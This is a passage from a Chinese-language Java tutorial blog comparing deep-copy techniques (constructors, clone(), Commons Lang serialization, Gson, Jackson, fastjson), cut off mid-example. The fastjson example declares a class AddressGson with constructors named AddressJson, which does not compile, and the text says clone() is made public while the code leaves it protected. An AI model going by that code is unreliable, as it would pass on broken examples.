title="几种深拷贝方式"></a>几种深拷贝方式</h3><h4 id="1-构造函数深拷贝"><a href="#1-构造函数深拷贝" class="headerlink" title="1.构造函数深拷贝"></a>1.构造函数深拷贝</h4><p>我们可以调用构造函数进行深拷贝，形参如果是基本类型和字符串则是直接赋值，如果是对象，则是重新new一个。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过构造器进行深拷贝测试</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserConstruct</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> AddressConstruct address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserConstruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserConstruct</span><span class="params">(String userName, AddressConstruct address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AddressConstruct address = <span class="keyword">new</span> AddressConstruct(<span class="string">"小区1"</span>, <span class="string">"小区2"</span>);</span><br><span class="line">        UserConstruct user = <span class="keyword">new</span> UserConstruct(<span class="string">"小李"</span>, address);</span><br><span class="line">        <span class="comment">// 调用构造函数进行深拷贝</span></span><br><span class="line">        UserConstruct copyUser = <span class="keyword">new</span> UserConstruct(user.getUserName(), <span class="keyword">new</span> AddressConstruct(address.getAddress1(), address.getAddress2()));</span><br><span class="line">        <span class="comment">// 修改源对象的值</span></span><br><span class="line">        user.getAddress().setAddress1(<span class="string">"小区3"</span>);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user == copyUser);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1() == copyUser.getAddress().getAddress1());</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1().equals(copyUser.getAddress().getAddress1()));</span><br><span class="line">        <span class="comment">// true</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress2().equals(copyUser.getAddress().getAddress2()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddressConstruct</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address1;</span><br><span class="line">    <span class="keyword">private</span> String address2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressConstruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressConstruct</span><span class="params">(String address1, String address2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address1 = address1;</span><br><span class="line">        <span class="keyword">this</span>.address2 = address2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-重载Clone（）方法深拷贝"><a href="#2-重载Clone（）方法深拷贝" class="headerlink" title="2.重载Clone（）方法深拷贝"></a>2.重载Clone（）方法深拷贝</h4><p>Object父类有个clone()的拷贝方法，不过它是protected类型的 ，我们需要重写它并修改为public类型，除此之外，子类还需要实现Cloneable接口来告诉JVM这个类上是可以拷贝的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddressClone</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address1;</span><br><span class="line">    <span class="keyword">private</span> String address2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressClone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressClone</span><span class="params">(String address1, String address2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address1 = address1;</span><br><span class="line">        <span class="keyword">this</span>.address2 = address2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> AddressClone <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (AddressClone) <span class="keyword">super</span>.clone();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过实现Clone接口实现深拷贝</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserClone</span> <span class="keyword">implements</span> <span class="title">Cloneable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> AddressClone address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserClone</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserClone</span><span class="params">(String userName, AddressClone address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Object父类有个clone()的拷贝方法，不过它是protected类型的，</span></span><br><span class="line"><span class="comment">     * 我们需要重写它并修改为public类型。除此之外，</span></span><br><span class="line"><span class="comment">     * 子类还需要实现Cloneable接口来告诉JVM这个类是可以拷贝的。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> CloneNotSupportedException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> UserClone <span class="title">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        <span class="comment">// 需要注意的是，super.clone()其实是浅拷贝，</span></span><br><span class="line">        <span class="comment">// 所以在重写UserClone类的clone()方法时，address对象需要调用address.clone()重新赋值</span></span><br><span class="line">        UserClone userClone = (UserClone) <span class="keyword">super</span>.clone();</span><br><span class="line">        userClone.setAddress(<span class="keyword">this</span>.address.clone());</span><br><span class="line">        <span class="keyword">return</span> userClone;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportedException </span>&#123;</span><br><span class="line">        AddressClone address = <span class="keyword">new</span> AddressClone(<span class="string">"小区1"</span>, <span class="string">"小区2"</span>);</span><br><span class="line">        UserClone user = <span class="keyword">new</span> UserClone(<span class="string">"小李"</span>, address);</span><br><span class="line">        UserClone copyUser = user.clone();</span><br><span class="line">        user.getAddress().setAddress1(<span class="string">"小区3"</span>);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user == copyUser);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1().equals(copyUser.getAddress().getAddress1()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-Apache-Commons-Lang序列化方式深拷贝"><a href="#3-Apache-Commons-Lang序列化方式深拷贝" class="headerlink" title="3.Apache Commons Lang序列化方式深拷贝"></a>3.Apache Commons Lang序列化方式深拷贝</h4><p>Java提供了序列化的能力，我们可以先将源对象进行序列化，再反序列化生成拷贝对象。但是，使用序列化的前提是拷贝的类（包括其成员变量）需要实现Serializable接口。</p><p>Apache Commons Lang包对Java序列化进行了封装，我们可以直接使用它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddressSerializable</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address1;</span><br><span class="line">    <span class="keyword">private</span> String address2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressSerializable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressSerializable</span><span class="params">(String address1, String address2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address1 = address1;</span><br><span class="line">        <span class="keyword">this</span>.address2 = address2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.SerializationUtils;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过Apache Commons Lang 序列化方式深拷贝</span></span><br><span class="line"><span class="comment"> * Java提供了序列化的能力，我们可以先将源对象进行序列化，再反序列化生成拷贝对象。</span></span><br><span class="line"><span class="comment"> * 但是，使用序列化的前提是拷贝的类（包括其成员变量）需要实现Serializable接口。</span></span><br><span class="line"><span class="comment"> * Apache Commons Lang包对Java序列化进行了封装，我们可以直接使用它。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserSerializable</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> AddressSerializable address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserSerializable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserSerializable</span><span class="params">(String userName, AddressSerializable address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AddressSerializable address = <span class="keyword">new</span> AddressSerializable(<span class="string">"小区1"</span>, <span class="string">"小区2"</span>);</span><br><span class="line">        UserSerializable user = <span class="keyword">new</span> UserSerializable(<span class="string">"小李"</span>, address);</span><br><span class="line">        UserSerializable copyUser = SerializationUtils.clone(user);</span><br><span class="line">        user.getAddress().setAddress1(<span class="string">"小区3"</span>);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user == copyUser);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1().equals(copyUser.getAddress().getAddress1()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-将对象序列化成JSON，再将JSON反序列化成对象"><a href="#4-将对象序列化成JSON，再将JSON反序列化成对象" class="headerlink" title="4. 将对象序列化成JSON，再将JSON反序列化成对象"></a>4. 将对象序列化成JSON，再将JSON反序列化成对象</h4><h5 id="4-1-Gson深拷贝"><a href="#4-1-Gson深拷贝" class="headerlink" title="4.1 Gson深拷贝"></a>4.1 Gson深拷贝</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddressGson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address1;</span><br><span class="line">    <span class="keyword">private</span> String address2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressGson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressGson</span><span class="params">(String address1, String address2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address1 = address1;</span><br><span class="line">        <span class="keyword">this</span>.address2 = address2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> com.google.gson.Gson;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用Gson序列化方式进行深拷贝</span></span><br><span class="line"><span class="comment"> * Gson可以将对象序列化成JSON，也可以将JSON反序列化成对象，所以我们可以用它进行深拷贝</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserGson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> AddressGson address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserGson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserGson</span><span class="params">(String userName, AddressGson address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AddressGson address = <span class="keyword">new</span> AddressGson(<span class="string">"小区1"</span>, <span class="string">"小区2"</span>);</span><br><span class="line">        UserGson user = <span class="keyword">new</span> UserGson(<span class="string">"小李"</span>, address);</span><br><span class="line">        <span class="comment">// 使用Gson序列化进行深拷贝</span></span><br><span class="line">        Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">        UserGson copyUser = gson.fromJson(gson.toJson(user), UserGson<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        user.getAddress().setAddress1(<span class="string">"小区3"</span>);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user == copyUser);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1().equals(copyUser.getAddress().getAddress1()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-2-Jackson深拷贝"><a href="#4-2-Jackson深拷贝" class="headerlink" title="4.2 Jackson深拷贝"></a>4.2 Jackson深拷贝</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddressJackson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address1;</span><br><span class="line">    <span class="keyword">private</span> String address2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressJackson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressJackson</span><span class="params">(String address1, String address2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address1 = address1;</span><br><span class="line">        <span class="keyword">this</span>.address2 = address2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.core.JsonProcessingException;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过Jackson方式实现深拷贝</span></span><br><span class="line"><span class="comment"> * Jackson与Gson相似，可以将对象序列化成JSON，明显不同的地方是拷贝的类（包括其成员变量）需要有默认的无参构造函数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserJackson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> AddressJackson address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserJackson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserJackson</span><span class="params">(String userName, AddressJackson address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> JsonProcessingException </span>&#123;</span><br><span class="line">        AddressJackson address = <span class="keyword">new</span> AddressJackson(<span class="string">"小区1"</span>, <span class="string">"小区2"</span>);</span><br><span class="line">        UserJackson user = <span class="keyword">new</span> UserJackson(<span class="string">"小李"</span>, address);</span><br><span class="line">        <span class="comment">// 使用Jackson序列化进行深拷贝</span></span><br><span class="line">        ObjectMapper objectMapper = <span class="keyword">new</span> ObjectMapper();</span><br><span class="line">        UserJackson copyUser = objectMapper.readValue(objectMapper.writeValueAsString(user), UserJackson<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        user.getAddress().setAddress1(<span class="string">"小区3"</span>);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user == copyUser);</span><br><span class="line">        <span class="comment">// false</span></span><br><span class="line">        System.out.println(user.getAddress().getAddress1().equals(copyUser.getAddress().getAddress1()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="4-3-fastjson深拷贝"><a href="#4-3-fastjson深拷贝" class="headerlink" title="4.3 fastjson深拷贝"></a>4.3 fastjson深拷贝</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AddressGson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String address1;</span><br><span class="line">    <span class="keyword">private</span> String address2;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressJson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">AddressJson</span><span class="params">(String address1, String address2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.address1 = address1;</span><br><span class="line">        <span class="keyword">this</span>.address2 = address2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">package</span> com.lyj.demo.pojo.cloneTest;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用fastjson序列化方式进行深拷贝</span></span><br><span class="line"><span class="comment"> * fastjson可以将对象序列化成JSON，也可以将JSON反序列化成对象，所以我们可以用它进行深拷贝</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserJson</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> AddressJson address;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserJson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserJson</span><span class="params">(String userName, AddressJson address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.userName = userName;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        AddressJson address = <span class="keyword">new</span> AddressJson(<span class="string">"小区1"</span>, <span 